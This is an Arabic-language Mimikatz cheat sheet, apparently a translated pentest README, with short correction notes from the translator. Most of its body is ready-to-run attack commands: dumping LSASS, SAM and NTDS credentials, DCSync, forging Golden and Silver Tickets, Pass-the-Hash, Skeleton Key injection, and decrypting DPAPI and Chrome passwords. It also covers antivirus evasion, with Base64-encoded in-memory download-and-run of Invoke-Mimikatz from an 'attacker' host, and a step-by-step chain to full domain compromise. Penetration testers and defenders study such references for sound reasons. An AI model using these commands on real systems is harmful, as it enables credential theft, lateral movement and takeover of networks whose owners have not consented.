<a id="-mimikatz---complete-cheatsheet"></a>
# 🔑 Mimikatz — ورقة مرجعية شاملة

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Windows Credential Extraction Tool
```

يشير الشعار إلى وظيفة Mimikatz بوصفها أداة لاستخراج بيانات اعتماد Windows.

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Credentials">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 أداة شديدة القوة لاستخراج بيانات اعتماد Windows</b>
</p>

---

<a id="-table-of-contents"></a>
## 📋 جدول المحتويات

- [ما هي أداة Mimikatz؟](#-what-is-mimikatz)
- [البدء](#-getting-started)
- [طرق التشغيل](#-execution-methods)
- [الوحدات الأساسية](#-core-modules)
- [استخراج بيانات الاعتماد](#-credential-extraction)
- [هجمات Kerberos](#-kerberos-attacks)
- [هجمات متقدمة](#-advanced-attacks)
- [تقنيات تفادي الرصد](#-evasion-techniques)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-mimikatz"></a>
## 🎯 ما هي أداة Mimikatz؟

**Mimikatz** أداة لمرحلة ما بعد الاستغلال أنشأها **Benjamin Delpy** ‏(@gentilkiwi)، وتتيح استخراج ما يلي بحسب الصلاحيات وإعدادات الحماية:

- 🔑 **كلمات مرور بنص صريح** من ذاكرة Windows، وتحديدًا LSASS، عند توفرها
- 🎫 **تذاكر Kerberos** من نوع TGT وTGS
- 🔐 **قيم تجزئة NTLM** من SAM/NTDS
- 📜 **الشهادات** والمفاتيح الخاصة
- 🗝️ **بيانات الاعتماد المخزنة مؤقتًا**
- 🔒 **أسرار واجهة حماية البيانات DPAPI**

<a id="why-is-it-important"></a>
### لماذا تعد مهمة؟

|الاستخدام|الوصف|
|----------|-------------|
|**سرقة بيانات الاعتماد**|استخراج كلمات المرور من الذاكرة|
|**التنقل الجانبي**|Pass-the-Hash وPass-the-Ticket|
|**رفع الصلاحيات**|انتحال هوية المستخدمين|
|**الحفاظ على الوصول**|التذاكر الذهبية والفضية Golden/Silver Tickets|
|**السيطرة على المجال**|استخدام DCSync للوصول إلى اختراق شامل لـ Active Directory|

---

<a id="-getting-started"></a>
## 🚀 البدء

<a id="download"></a>
### التنزيل

```bash
# المستودع الرسمي
git clone https://github.com/gentilkiwi/mimikatz.git

# ملفات تنفيذية جاهزة ضمن الإصدارات
# https://github.com/gentilkiwi/mimikatz/releases
```

<a id="requirements"></a>
### المتطلبات

- صلاحيات **Administrator/SYSTEM** لمعظم الوظائف
- امتياز **SeDebugPrivilege** للوصول إلى LSASS، مع مراعاة الحماية المفعلة
- نظام Windows بمعمارية x64 أو x86

<a id="first-commands"></a>
### الأوامر الأولى

> **تصحيح:** الأمر `token::elevate` ينتحل رمز وصول مناسبًا، ولا يفعّل جميع الامتيازات كما يذكر تعليق الأصل. أُبقيت أوامر الأمثلة دون تعديل. [شيفرة وحدة token الرسمية](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_token.c).

```cmd
# تشغيل mimikatz
mimikatz.exe

# فحص الامتيازات
mimikatz # privilege::debug
Privilege '20' OK

# تفعيل جميع الامتيازات بحسب وصف الأصل؛ راجع التوضيح
mimikatz # token::elevate

# الخروج
mimikatz # exit
```

---

<a id="-execution-methods"></a>
## 💻 طرق التشغيل

<a id="1-standalone-binary"></a>
### 1. الملف التنفيذي المستقل

```cmd
# تشغيل مباشر قد تكتشفه برامج مكافحة الفيروسات (AV)
mimikatz.exe

# أمر في سطر واحد
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# تسجيل المخرجات في ملف
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# باستخدام أمر log
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

<a id="2-powershell-invoke-mimikatz"></a>
### 2. التشغيل عبر PowerShell باستخدام Invoke-Mimikatz

```powershell
# التنزيل والتشغيل في الذاكرة (Fileless)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# استخراج بيانات الاعتماد
Invoke-Mimikatz -DumpCreds

# استخراج الشهادات
Invoke-Mimikatz -DumpCerts

# التشغيل على جهاز بعيد
Invoke-Mimikatz -ComputerName DC01
```

<a id="3-metasploit-kiwi"></a>
### 3. التشغيل عبر Metasploit باستخدام Kiwi

```bash
# داخل جلسة meterpreter
meterpreter > load kiwi

# عرض المساعدة
meterpreter > help kiwi

# استخراج جميع بيانات الاعتماد
meterpreter > creds_all

# استخراج قيم التجزئة (Hashes)
meterpreter > lsa_dump_sam

# استخراج الأسرار
meterpreter > lsa_dump_secrets

# تذاكر Kerberos
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

<a id="4-crackmapexec"></a>
### 4. التشغيل عبر CrackMapExec

```bash
# استخراج SAM
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# استخراج أسرار LSA
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# استخراج NTDS
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

<a id="5-from-memory-dump"></a>
### 5. التحليل من نسخة تفريغ الذاكرة

```cmd
# إنشاء نسخة من ذاكرة LSASS باستخدام إدارة المهام أو procdump
procdump.exe -ma lsass.exe lsass.dmp

# تحميل نسخة الذاكرة في mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

<a id="-core-modules"></a>
## 🔧 الوحدات الأساسية

<a id="module-overview"></a>
### نظرة عامة على الوحدات

|الوحدة|الوصف|
|--------|-------------|
|**sekurlsa**|استخراج بيانات الاعتماد من ذاكرة LSASS|
|**lsadump**|استخراج SAM وNTDS والأسرار والبيانات المخزنة مؤقتًا|
|**kerberos**|التعامل مع تذاكر Kerberos|
|**crypto**|شهادات CryptoAPI|
|**vault**|خزنة Windows Vault ومدير بيانات الاعتماد|
|**token**|التعامل مع رموز الوصول|
|**privilege**|التعامل مع الامتيازات|
|**process**|التعامل مع العمليات|
|**service**|التعامل مع الخدمات|
|**dpapi**|أسرار DPAPI|
|**misc**|أوامر متنوعة|

<a id="getting-help"></a>
### الحصول على المساعدة

```cmd
# عرض جميع الوحدات
mimikatz # ::

# مساعدة الوحدة
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

<a id="-credential-extraction"></a>
## 🔐 استخراج بيانات الاعتماد

<a id="sekurlsa-module-lsass"></a>
### وحدة sekurlsa للتعامل مع LSASS

```cmd
# تفعيل امتياز التنقيح أولًا!
mimikatz # privilege::debug

# استخراج بيانات تسجيل الدخول: نص صريح وقيم NTLM وSHA1 عند توفرها
mimikatz # sekurlsa::logonpasswords

# استخراج قيم تجزئة NTLM فقط
mimikatz # sekurlsa::msv

# استخراج تذاكر Kerberos
mimikatz # sekurlsa::tickets

# استخراج بيانات WDigest، بنص صريح إذا كانت الميزة مفعلة
mimikatz # sekurlsa::wdigest

# استخراج مفاتيح تشفير Kerberos
mimikatz # sekurlsa::ekeys

# استخراج بيانات اعتماد DPAPI
mimikatz # sekurlsa::dpapi

# استخراج بيانات اعتماد عملية محددة بحسب وصف الأصل
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# استخراج بيانات اعتماد TsPkg الخاصة بـ RDP
mimikatz # sekurlsa::tspkg

# استخراج بيانات اعتماد LiveSSP
mimikatz # sekurlsa::livessp

# استخراج بيانات اعتماد SSP
mimikatz # sekurlsa::ssp

# استخراج بيانات اعتماد CloudAP الخاصة بـ Azure AD
mimikatz # sekurlsa::cloudap
```

<a id="lsadump-module-samntds"></a>
### وحدة lsadump للتعامل مع SAM/NTDS

> **تصحيح للتسمية:** `lsadump::lsa /patch` و`/inject` يتعاملان مع خدمة LSA في النظام الجاري؛ وصفهما بأنه استخراج ملف `NTDS.dit` مباشرة غير دقيق. [شيفرة lsadump الرسمية](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c).

```cmd
# استخراج قاعدة SAM للحسابات المحلية
mimikatz # lsadump::sam

# استخراج SAM باستخدام خلية سجل SYSTEM
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# استخراج أسرار LSA
mimikatz # lsadump::secrets

# استخراج بيانات الاعتماد المخزنة مؤقتًا (DCC2)
mimikatz # lsadump::cache

# محاكاة النسخ المتماثل لوحدة تحكم المجال (DCSync)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# استخراج بيانات وحدة تحكم المجال بحسب وصف الأصل؛ راجع التوضيح
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# استخراج مفاتيح علاقات الثقة
mimikatz # lsadump::trust /patch

# استخراج مفاتيح DPAPI الاحتياطية
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

<a id="vault-module-credential-manager"></a>
### وحدة vault لمدير بيانات الاعتماد (Credential Manager)

```cmd
# عرض بيانات اعتماد الخزنة
mimikatz # vault::list

# استخراج بيانات اعتماد الخزنة
mimikatz # vault::cred /patch
```

<a id="dpapi-module"></a>
### وحدة dpapi

```cmd
# استخراج المفاتيح الرئيسية لـ DPAPI
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# فك تشفير كتلة بيانات DPAPI
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# كلمات مرور Chrome
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

<a id="-kerberos-attacks"></a>
## 🎫 هجمات Kerberos

<a id="view-tickets"></a>
### عرض التذاكر

```cmd
# عرض جميع التذاكر
mimikatz # kerberos::list

# عرض التذاكر مع التفاصيل
mimikatz # kerberos::list /export

# تصدير جميع التذاكر
mimikatz # sekurlsa::tickets /export
```

<a id="pass-the-ticket-ptt"></a>
### تمرير التذكرة (Pass-the-Ticket أو PtT)

```cmd
# مسح التذاكر الموجودة
mimikatz # kerberos::purge

# استيراد تذكرة
mimikatz # kerberos::ptt ticket.kirbi

# التحقق من التذكرة
mimikatz # kerberos::list
```

<a id="golden-ticket-domain-admin-persistence"></a>
### التذكرة الذهبية Golden Ticket للحفاظ على صلاحيات إدارة المجال

> **توضيح:** خيار `/sids` يضيف معرفات SID إضافية إلى التذكرة، ولا يحدد وحدة تحكم مجال. كذلك فمعرف حساب المستخدم ليس قائمة معرفات مجموعاته؛ أُبقي مثال `/groups` كما في الأصل. [شيفرة Kerberos الرسمية](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c).

```cmd
# المتطلبات:
# - اسم المجال (domain.local)
# - معرف أمان المجال Domain SID ‏(S-1-5-21-...)
# - قيمة تجزئة NTLM لحساب krbtgt
# - اسم المستخدم المستهدف؛ يذكر الأصل إمكانية استخدام اسم غير موجود

# إنشاء تذكرة ذهبية Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# الإنشاء والتصدير
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# مع مجموعات محددة؛ يخلط وصف الأصل بين RID للحساب وRID للمجموعة، راجع التوضيح
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# مع وحدة تحكم مجال مستهدفة بحسب وصف الأصل؛ راجع توضيح ‎/sids
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

<a id="silver-ticket-service-specific"></a>
### التذكرة الفضية Silver Ticket لخدمة محددة

```cmd
# المتطلبات:
# - اسم المجال
# - معرف أمان المجال Domain SID
# - قيمة تجزئة NTLM لحساب الخدمة المستهدف
# - الاسم الرئيسي للخدمة (SPN)

# إنشاء تذكرة فضية لخدمة CIFS لمشاركة الملفات
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# تذكرة فضية لخدمة HTTP الخاصة بالويب
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# تذكرة فضية لخدمة SQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# تذكرة فضية لخدمة WinRM/PSRemoting
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

<a id="-advanced-attacks"></a>
## 💀 هجمات متقدمة

<a id="pass-the-hash-pth"></a>
### تمرير التجزئة (Pass-the-Hash أو PtH)

```cmd
# تشغيل أمر بهوية مستخدم باستخدام قيمة تجزئة NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# باستخدام مفاتيح AES
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# استخدام PtH لإنشاء عملية
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

<a id="overpass-the-hash-pass-the-key"></a>
### استخدام التجزئة لطلب تذكرة Kerberos ‏(Overpass-the-Hash أو Pass-the-Key)

```cmd
# استخدام تجزئة NTLM للوصول إلى تذكرة Kerberos
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# ثم طلب تذكرة منح التذاكر (TGT)
# ينبغي أن يعرض klist تذكرة Kerberos
```

<a id="dcsync-attack"></a>
### هجوم DCSync

```cmd
# طلب بيانات مستخدم واحد عبر النسخ المتماثل
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# طلب بيانات krbtgt لاستخدامها مع Golden Ticket
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# طلب بيانات جميع المستخدمين
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# تحديد وحدة تحكم مجال لطلب بيانات النسخ المتماثل
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

<a id="skeleton-key"></a>
### هجوم المفتاح الهيكلي (Skeleton Key)

```cmd
# حقن Skeleton Key في LSASS لوحدة التحكم؛ يصف الأصل المصادقة بكلمة "mimikatz"
mimikatz # misc::skeleton

# استمرار الأثر حتى إعادة تشغيل وحدة تحكم المجال
# تسجيل الدخول باسم مستخدم مع كلمة المرور mimikatz بحسب سيناريو الأصل
```

<a id="dpapi-abuse"></a>
### إساءة استخدام DPAPI

```cmd
# استخراج المفاتيح الرئيسية (Master Keys)
mimikatz # sekurlsa::dpapi

# فك تشفير ملف بيانات اعتماد
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# كلمات مرور RDP المحفوظة
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

<a id="token-manipulation"></a>
### التعامل مع رموز الوصول (Tokens)

```cmd
# عرض رموز الوصول
mimikatz # token::list

# انتحال رمز وصول SYSTEM عند توفر المتطلبات
mimikatz # token::elevate

# انتحال رمز وصول مستخدم محدد
mimikatz # token::elevate /user:Administrator

# العودة إلى رمز الوصول الأصلي
mimikatz # token::revert

# التشغيل بهوية مستخدم محدد
mimikatz # token::run /user:domain\admin
```

---

<a id="-evasion-techniques"></a>
## 🛡️ تقنيات تفادي الرصد

<a id="obfuscated-names"></a>
### أسماء مموهة

```cmd
# إعادة تسمية mimikatz.exe
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

<a id="powershell-obfuscation"></a>
### تمويه PowerShell

```powershell
# الترميز باستخدام Base64
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

<a id="memory-only-execution"></a>
### التشغيل في الذاكرة فقط

```powershell
# تشغيل Invoke-Mimikatz في الذاكرة
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# أو استخدام kiwi ضمن meterpreter
meterpreter > load kiwi
meterpreter > creds_all
```

<a id="lsass-dump-alternatives"></a>
### طرق بديلة لتفريغ ذاكرة LSASS

```cmd
# أداة Procdump الموقعة من Microsoft
procdump.exe -ma lsass.exe lsass.dmp

# المكتبة المدمجة comsvcs.dll
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# إدارة المهام عبر الواجهة الرسومية
# النقر بزر الفأرة الأيمن على lsass.exe ثم Create dump file

# أداة SQLDumper المرفقة مع SQL Server
sqldumper.exe <lsass_pid> 0 0x01100
```

<a id="credential-guard-bypass"></a>
### تجاوز Credential Guard بحسب وصف الأصل

> **توضيح:** يعزل Credential Guard الأسرار باستخدام VBS؛ لا يثبت خطأ واحد وحده تفعيله. أما DCSync فمسار نسخ متماثل مستقل يتطلب أذوناته، وليس تجاوزًا عامًا لحماية الذاكرة. [شرح Microsoft لـ Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works)، [أذونات DCSync لدى Microsoft](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/accounts).

```cmd
# التحقق من تفعيل Credential Guard بحسب وصف الأصل؛ راجع التوضيح
mimikatz # sekurlsa::logonpasswords
# قد يظهر الخطأ "ERROR kuhl_m_sekurlsa_acquireLSA"، لكنه ليس تشخيصًا قاطعًا وحده

# بديل في الأصل: استخدام DCSync، ويتطلب أذونات النسخ المتماثل
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="essential-one-liners"></a>
### أوامر أساسية في سطر واحد

```cmd
# استخراج جميع بيانات الاعتماد
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# استخراج SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# طلب جميع البيانات عبر DCSync
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# التذكرة الذهبية Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# تمرير التجزئة Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

<a id="module-quick-reference"></a>
### مرجع سريع للوحدات

|الأمر|الوصف|
|---------|-------------|
|`privilege::debug`|تفعيل امتياز التنقيح|
|`token::elevate`|انتحال رمز SYSTEM عند توفر المتطلبات|
|`sekurlsa::logonpasswords`|استخراج جميع بيانات الاعتماد المتاحة من LSASS|
|`sekurlsa::msv`|استخراج قيم تجزئة NTLM|
|`sekurlsa::tickets`|استخراج تذاكر Kerberos|
|`sekurlsa::pth`|تمرير التجزئة Pass-the-Hash|
|`lsadump::sam`|استخراج قاعدة SAM|
|`lsadump::secrets`|استخراج أسرار LSA|
|`lsadump::dcsync`|هجوم DCSync|
|`lsadump::lsa /patch`|استخراج بيانات عبر LSA على وحدة التحكم؛ راجع التوضيح|
|`kerberos::list`|عرض تذاكر Kerberos|
|`kerberos::ptt`|تمرير التذكرة Pass-the-Ticket|
|`kerberos::golden`|إنشاء تذكرة ذهبية أو فضية|
|`kerberos::purge`|مسح التذاكر|
|`vault::list`|عرض بيانات اعتماد الخزنة|
|`dpapi::cred`|فك تشفير بيانات اعتماد DPAPI|

<a id="attack-chain-example"></a>
### مثال لتسلسل الهجوم

يوضح التسلسل الوصول الأولي، ثم تفعيل امتياز التنقيح، واستخراج بيانات الاعتماد، واستخدامها للتنقل الجانبي، ثم طلب بيانات krbtgt عبر DCSync وإنشاء تذكرة ذهبية. أبقينا القائمة الأصلية بما فيها أوامرها؛ يعتمد نجاح كل خطوة على متطلباتها وصلاحياتها.

```
1. Get initial access
2. privilege::debug
3. sekurlsa::logonpasswords (get creds)
4. sekurlsa::pth (lateral movement)
5. lsadump::dcsync /user:krbtgt (get krbtgt hash)
6. kerberos::golden (create Golden Ticket)
7. Full domain compromise!
```

---

<a id="-resources"></a>
## 📚 الموارد

- [مستودع GitHub الرسمي](https://github.com/gentilkiwi/mimikatz)
- [ويكي Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki)
- [دليل Mimikatz من ADSecurity](https://adsecurity.org/?page_id=1821)
- [دليل Mimikatz من HackTricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [رفع الصلاحيات في Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.ar.md)
- [أداة Meterpreter](../../Metasploit/translations/Meterpreter.ar.md)

---

<p align="center">
  <b>🔑 أتقن اختبار هجمات بيانات اعتماد Windows!</b><br>
  <i>Mimikatz — أداة متعددة الاستخدامات لاختبارات Windows</i>
</p>
